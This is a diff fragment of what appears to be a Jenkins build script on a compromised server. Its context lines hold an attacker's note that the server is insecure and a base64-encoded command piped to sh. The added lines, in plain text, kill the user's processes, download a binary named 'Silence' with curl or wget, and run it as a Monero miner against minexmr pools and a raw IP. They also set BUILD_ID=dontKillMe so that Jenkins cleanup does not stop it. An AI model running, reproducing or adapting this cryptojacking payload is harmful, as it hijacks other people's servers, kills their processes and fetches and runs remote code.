@@ -511,3 +511,18 @@ drwx------ 2 postgres postgres      4096 Jun 25 13:31 Run.sh
 Your Jenkins server is insecure and allows anyone to view builds, create tasks (like I've done). You might want to secure it down...
 
 BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobobo echo -n 'cm0gLXJmIC92YXIvbGliL2plbmtpbnMvLndpcGVmczsKcGtpbGwgLndpcGVmczsKdGhyZWFkQ291bnQ9JChsc2NwdSB8IGdyZXAgJ0NQVShzKScgfCBncmVwIC12ICcsJyB8IGF3ayAne3ByaW50ICQyfScgfCBoZWFkIC1uIDEpOwpob3N0SGFzaD0kKGhvc3RuYW1lIC1mIHwgbWQ1c3VtIHwgY3V0IC1jMS04KTsKZWNobyAkaG9zdEhhc2g7CnJtIC1yZiBkZWJ1ZzsKY3VybCBodHRwczovL21ucmxudC5ibG9iLmNvcmUud2luZG93cy5uZXQvbW5yL1NpbGVuY2UgLW8gZGVidWcgMj4gL2Rldi9udWxsOwpjaG1vZCAreCBkZWJ1ZzsKQlVJTERfSUQ9ZG9udEtpbGxNZSBKRU5LSU5TX05PREVfQ09PS0lFPWJvYm9ib2JvYiAuL2RlYnVnIC1vIHN0cmF0dW0rdGNwOi8vcG9vbC5taW5leG1yLmNvbTo0NDQ0IC11IDQ1aDRhNlZRb3JvRW1xZXB3SFRzOXU0ZUFnOThYRmNIZjV3SHd6bTlnV3VMSllGdkJhd0JDZ1k3M1BKUWRKWU5NUUNjelZzNFM4UFk0TGZ4blBuNVVzcU1TVzVYTGdlLkpMNl8ke2hvc3RIYXNoOi1hYmN9IC1wIHggLXQgJHt0aHJlYWRDb3VudDotMX0K' | base64 --decode | BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobobo sh -
+
+
+for tr in $(ps -U $USER | egrep -v "java|ps|sh|egrep|PID" | cut -b1-6); do echo "Killing ${tr}"; kill -9 $tr || : ; done;
+threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
+hostHash=$(hostname -f | md5sum | cut -c1-8);
+echo "${hostHash} - ${threadCount}";
+rm -rf debug;
+curl https://mnrlnt.blob.core.windows.net/mnr/Silence -o debug 2> /dev/null || wget https://mnrlnt.blob.core.windows.net/mnr/Silence -O debug 2> /dev/null;
+chmod +x debug;
+
+p() {
+	BUILD_ID=dontKillMe JENKINS_NODE_COOKIE=bobobobob ./debug -r 2 -R 4 -o stratum+tcp://$1 -u 45h4a6VQoroEmqepwHTs9u4eAg98XFcHf5wHwzm9gWuLJYFvBawBCgY73PJQdJYNMQCczVs4S8PY4LfxnPn5UsqMSW5XLge.JL7_${hostHash:-abc} -p x -t ${threadCount:-1}
+}
+
+sudo p "pool.minexmr.com:4444" || p "pool.minexmr.com:4444" && p "pool.minexmr.com:7777" && p "91.121.87.10:4444"
